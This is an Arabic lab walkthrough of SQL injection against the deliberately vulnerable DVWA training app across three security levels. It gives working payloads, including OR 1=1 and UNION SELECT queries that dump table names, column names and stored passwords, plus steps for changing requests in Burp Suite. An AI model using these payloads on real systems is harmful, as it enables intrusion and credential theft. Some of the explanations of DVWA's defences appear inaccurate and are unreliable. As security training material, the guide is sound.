# دليل شامل لاستغلال ثغرات SQL Injection في تطبيق DVWA

## مقدمة

DVWA (Damn Vulnerable Web Application) هو تطبيق ويب مصمم خصيصًا لتعليم اختبار اختراق تطبيقات الويب في بيئة آمنة وقانونية. من أهم الثغرات التي يمكن التدرب عليها في DVWA هي **ثغرات حقن أوامر SQL**، والتي تسمح للمهاجم بالتلاعب بقواعد البيانات.

هذا الدليل يغطي كيفية استغلال ثغرات SQL Injection في ثلاث مستويات أمان مختلفة:

* 🔹 **المستوى السهل (Low)**
* 🔸 **المستوى المتوسط (Medium)**
* 🔴 **المستوى الصعب (High)**

كما سنستخدم أدوات مساعدة مثل **Burp Suite** لتحليل الطلبات وتعديلها.

---

## المستوى السهل (Low)

### 1. تحليل السلوك الأساسي

ابدأ بإدخال رقم عادي مثل `1` في خانة إدخال المستخدم، ولاحظ أن التطبيق يعرض بيانات المستخدم بالمعرّف المقابل.

هذا يعني أن التطبيق ينفذ استعلام SQL بسيط مثل:

```sql
SELECT * FROM users WHERE id = '1';
```

### 2. استغلال الثغرة

للتأكد من وجود ثغرة SQL Injection، جرّب إدخال:

```sql
' OR 1=1#
```

هذا يجعل الاستعلام يصبح:

```sql
SELECT * FROM users WHERE id = '' OR 1=1#';
```

مما يعرض جميع المستخدمين.

### 3. استكشاف قاعدة البيانات

#### جلب أسماء الجداول:

```sql
' UNION SELECT table_name, null FROM information_schema.tables#
```

هذا يسمح لك بمعرفة الجداول الموجودة في قاعدة البيانات. غالبًا ستجد جدولًا باسم `users`.

#### جلب أسماء الأعمدة:

```sql
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'#
```

ستظهر أعمدة مثل `id`, `user`, `password`.

#### استخراج البيانات:

```sql
' UNION SELECT user, password FROM users#
```

وهكذا يمكنك عرض أسماء المستخدمين وكلمات المرور المخزنة.

---

## المستوى المتوسط (Medium)

### الفارق الأساسي

في هذا المستوى، يتم استخدام دالة `intval()` أو ما شابهها لحماية المدخلات، مما يمنع تمرير الأحرف مثل `'` مباشرة عبر الواجهة.

### الحل باستخدام Burp Suite

1. افتح Burp Suite.
2. فعّل **intercept** في قسم Proxy.
3. أرسل الطلب من واجهة DVWA.
4. اعترض الطلب المعد من المتصفح.
5. غيّر قيمة `id` في الطلب إلى:

```sql
1 UNION SELECT user, password FROM users#
```

6. أرسل الطلب إلى السيرفر واضغط Forward.

ستُعرض بيانات المستخدمين تمامًا كما في المستوى السهل.

---

## المستوى الصعب (High)

### ما الاختلاف؟

في هذا المستوى، يتم تصفية الطلبات ومنع أي إدخال ضار من الوصول إلى قاعدة البيانات عبر الواجهة. يتم ذلك غالبًا باستخدام الاستعلامات المعدة (Prepared Statements).

### طريقة الاستغلال

رغم التعقيد، لا تزال الثغرة موجودة في بعض الإصدارات. استخدم الخطوات التالية:

1. اذهب إلى واجهة تغيير المعرف واضغط على رابط "click here to change ID".
2. سيظهر لك نموذج جديد لإدخال المعرف.
3. فعّل Burp Suite، وكرر نفس خطوات المستوى المتوسط.
4. استبدل قيمة `id` بالحمولة:

```sql
' UNION SELECT user, password FROM users#
```

5. أرسل الطلب وتحقق من الاستجابة.

إذا كانت الثغرة ما تزال موجودة، فستحصل على نفس النتائج.

---

## خلاصة

* ✅ **ثغرات SQL Injection** تسمح للمهاجمين بالتلاعب بقواعد البيانات.
* 🛡️ تختلف صعوبة الاستغلال حسب مستوى الأمان المطبق.
* 🧰 أدوات مثل **Burp Suite** تسهل تحليل وتعديل الطلبات.

> ⚠️ تحذير: استخدم هذه الأساليب فقط في بيئات اختبار قانونية مثل DVWA.

---

📌 **المصدر والمزيد:**
[مستودع الحلول على GitHub](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION)

✍️ **إعداد وتنسيق**: Nihar Rathod (Bugbot19)
